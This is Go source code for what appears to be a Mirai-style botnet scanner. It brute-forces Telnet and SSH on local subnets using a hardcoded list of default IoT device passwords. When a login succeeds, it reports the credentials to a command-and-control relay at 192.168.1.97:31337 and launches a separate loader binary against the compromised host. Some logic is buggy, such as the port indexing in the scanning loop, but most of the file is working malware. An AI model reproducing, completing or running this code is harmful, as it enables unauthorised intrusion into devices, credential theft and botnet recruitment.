package main

import (
	"fmt"
	"net"
	"strings"
	"time"
	"os"
	"os/exec"
	"golang.org/x/crypto/ssh"
)

var (
	MAlist = [][]string{
        {"root", "vizxv"},
		{"admin", "password"},
		{"root", "admin"},
		{"admin", "admin"},
        {"root", "888888"},
        {"root", "xmhdipc"},
        {"root", "default"},
        {"root", "juantech"},
        {"root", "123456"},
        {"root", "54321"},
        {"support", "support"},
        {"root", ""},
        {"root", "root"},
        {"root", "12345"},
        {"user", "user"},
        {"admin", ""},
        {"root", "pass"},
        {"admin", "admin1234"},
        {"root", "1111"},
        {"admin", "smcadmin"},
        {"admin", "1111"},
        {"root", "666666"},
        {"root", "password"},
        {"root", "1234"},
        {"root", "klv123"},
        {"Administrator", "admin"},
        {"service", "service"},
        {"supervisor", "supervisor"},
        {"guest", "guest"},
        {"guest", "12345"},
        {"admin1", "password"},
        {"administrator", "1234"},
        {"666666", "666666"},
        {"888888", "888888"},
        {"ubnt", "ubnt"},
        {"root", "klv1234"},
        {"root", "Zte521"},
        {"root", "hi3518"},
        {"root", "jvbzd"},
        {"root", "anko"},
        {"root", "zlxx."},
        {"root", "7ujMko0vizxv"},
        {"root", "7ujMko0admin"},
        {"root", "system"},
        {"root", "ikwb"},
        {"root", "dreambox"},
        {"root", "user"},
        {"root", "realtek"},
        {"root", "00000000"},
        {"admin", "1111111"},
        {"admin", "1234"},
        {"admin", "12345"},
        {"admin", "54321"},
        {"admin", "123456"},
        {"admin", "7ujMko0admin"},
        {"admin", "pass"},
        {"admin", "meinsm"},
        {"tech", "tech"},
        {"mother", "fucker"},
    }

	__RELAY_H__   = "192.168.1.97"
	__RELAY_P__   = 31337
	__RELAY_PS_   = "||"
	__TIMEOUT__   = 2 * time.Second
	__C2DELAY__   = 5 * time.Second
	__THREADS__   = 10
)

func getCredentials(pindex int) (string, string) {
	user := MAlist[pindex][0]
	password := MAlist[pindex][1]
	fmt.Printf("[Scanner] Trying --> %s : %s\n", user, password)
	return user, password
}

func isTelnetOpen(ip string,port string) {
	fmt.Printf("[Scanner] Scanning %s..\n", ip)
	conn, err := net.DialTimeout("tcp", ip + ":"+port, __TIMEOUT__)
	defer conn.Close()
	if err == nil {
		fmt.Printf("[Scanner] Found IP address: %s\n", ip)
		pindex:=0
		user:=""
		password:=""
		user,password = getCredentials(pindex)
		for{
			s:=""
			try_times:=0
			for {
				time.Sleep(1*time.Second)
				buf := make([]byte, 256)
				conn_word,err:=conn.Read(buf)
				if err==nil{
					s = string(buf[:conn_word])
					//fmt.Println(s)
					if strings.Contains(s,"incorrect"){
						pindex++
						user,password = getCredentials(pindex)
						if pindex >= len(MAlist){
							break
					}	
					}
					if strings.Contains(s,"#"){
						fmt.Println("Sucessful")
						if validateC2(ip,port){
							c2crd(user,password,ip,port)
						}else{
							writetolocal(user+":"+password)
						}
						go func(){
							fmt.Println("execute this file")
							cmd:=exec.Command("./loader "+user+" "+password+" "+ip+" "+port)
							cmd.Run()
						}()
						return 
					}
					if strings.Contains(s,"login")||strings.Contains(s,"Login")||strings.Contains(s,"password")||strings.Contains(s,"Password"){
						break
					}
					
				}else{
					return
				}
				try_times++
				if try_times>5{
					fmt.Println("Retry Max! please try again")
					return
				}
			}	
			if strings.Contains(s,"login")||strings.Contains(s,"Login")||strings.Contains(s,"username"){
				conn.Write([]byte(user+"\n"))
			}
			if strings.Contains(s,"password")||strings.Contains(s,"Password"){
				conn.Write([]byte(password+"\n"))
			}
			//fmt.Println("------------------------------")
		}
	}else {
		return 
	}
}

func isSSHOpen(ip string) {
	pindex := 0
	retryTwoTimes := false
	for {
		username, password := getCredentials(pindex)
		pindex++
		config := &ssh.ClientConfig{
			User: username,
			Auth: []ssh.AuthMethod{
				ssh.Password(password),
			},
			Timeout: __TIMEOUT__,
		}
		client, err := ssh.Dial("tcp", ip+":22", config)
		if err == nil {
			defer client.Close()
			fmt.Printf("[Scanner] Found combo:\n\tHOSTNAME: %s\n\tUSERNAME: %s\n\tPASSWORD: %s\n", ip, username, password)
			return
		} else if strings.Contains(err.Error(), "quota exceeded") {
			fmt.Println("[Scanner] Quota exceeded, retrying with delay...")
			time.Sleep(60 * time.Second)
			if retryTwoTimes {
				return
			}
			retryTwoTimes = true
			continue
		} else if strings.Contains(err.Error(), "connection refused") {
			fmt.Printf("[Scanner] Host: %s is unreachable\n", ip)
			return
		} else if strings.Contains(err.Error(), "unable to authenticate") {
			fmt.Printf("[Scanner] Invalid credentials for %s:%s\n", username, password)
			return
		}
	}
}

func writetolocal(data string ){
	filename := "store.txt"
	_, err := os.Stat(filename)
	if os.IsNotExist(err) {
		// 檔案不存在，建立檔案並寫入內容
		file, err := os.Create(filename)
		if err != nil {
			fmt.Println("無法建立檔案:", err)
			return
		}
		defer file.Close()

		_, err = file.WriteString(data)
		if err != nil {
			fmt.Println("寫入檔案失敗:", err)
			return
		}

		fmt.Println("已建立新檔案並寫入內容")
	} else {
		// 檔案存在，直接寫入內容
		file, err := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND, 0644)
		if err != nil {
			fmt.Println("開啟檔案失敗:", err)
			return
		}
		defer file.Close()

		_, err = file.WriteString(data)
		if err != nil {
			fmt.Println("寫入檔案失敗:", err)
			return
		}

		fmt.Println("已寫入內容到現有檔案")
	}
}

func validateC2(ip string,port string )bool {
	fmt.Println("[Scanner] Connecting to remote relay ...")
	for {
		tcpClientA, err := net.Dial("tcp",  fmt.Sprintf("%s:%d", __RELAY_H__, __RELAY_P__))
		if err == nil {
			tcpClientA.Write([]byte("#"))
			data := make([]byte, 1024)
			n, err := tcpClientA.Read(data)
			if err == nil {
				dataStr := string(data[:n])
				if dataStr == "200" {
					tcpClientA.Close()
					fmt.Println("[Scanner] Remote relay returned code 200(online).")
					return true
				}
			}
			tcpClientA.Close()
		}
		fmt.Printf("[Scanner] Remote relay unreachable retrying in %s ...\n", __C2DELAY__)
		time.Sleep(__C2DELAY__)
	}
	return false
}

func c2crd(usr string, psw string, ip string, port string) {
	for {
		fmt.Println("[Scanner] Sending credentials to remote relay..")
		tcpClientA, err := net.Dial("tcp", fmt.Sprintf("%s:%d", __RELAY_H__, __RELAY_P__))
		if err != nil {
			fmt.Printf("[Scanner] Unable to contact remote relay (%s)\n", err)
			time.Sleep(__C2DELAY__)
			continue
		}
		tcpClientA.Write([]byte("!" + __RELAY_PS_ + usr + __RELAY_PS_ + psw + __RELAY_PS_ + ip + __RELAY_PS_ + port))
		data := make([]byte, 1024)
		n, err := tcpClientA.Read(data)
		if err != nil {
			fmt.Printf("[Scanner] Unable to read data from remote relay (%s)\n", err)
			tcpClientA.Close()
			time.Sleep(__C2DELAY__)
			continue
		}
		dataStr := string(data[:n])
		if dataStr == "10" {
			tcpClientA.Close()
			fmt.Println("[Scanner] Remote relay returned code 10(ok).")
			break
		}
		tcpClientA.Close()
	}
}

func generateIP(index1 int,index0 int) string {
	return fmt.Sprintf("192.168.%d.%d", index1, index0)
}

func checkPort(ip string, port int) bool {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func Scanner() {
	port:=[3]int{22,23,2323}
	for i := 1; i <= 255; i++ {
		for j := 1; j <= 255; j++ {
			ip := generateIP(i,j)
			for k:=0 ; k<len(port) ; k++{
				checkPort(ip,port[j])
				if port[j]==23 || port[j]==2323{
					isTelnetOpen(ip,intToString(port[j]))
				}else{
					isSSHOpen(ip)
				}
			}
		}
	}
	
 
}
func intToString(num int) string {
	// Handle the special case of 0 separately
	if num == 0 {
		return "0"
	}

	// Determine the sign of the number
	sign := ""
	if num < 0 {
		sign = "-"
		num = -num
	}

	// Convert each digit to its corresponding ASCII character
	var digits []byte
	for num > 0 {
		digit := '0' + byte(num%10)
		digits = append([]byte{digit}, digits...)
		num /= 10
	}

	return sign + string(digits)
}

func main() {
	fmt.Println("[Scanner] Scanner process started ..")
	//isSSHOpen("192.168.1.163")
	isTelnetOpen("192.168.1.181","23")
	//Scanner()

	//if validateC2("192.168.1.97","31337"){
	//	c2crd("test","test","192.168.1.97","31337")
	//} //test connect relay
	time.Sleep(20*time.Second)
}

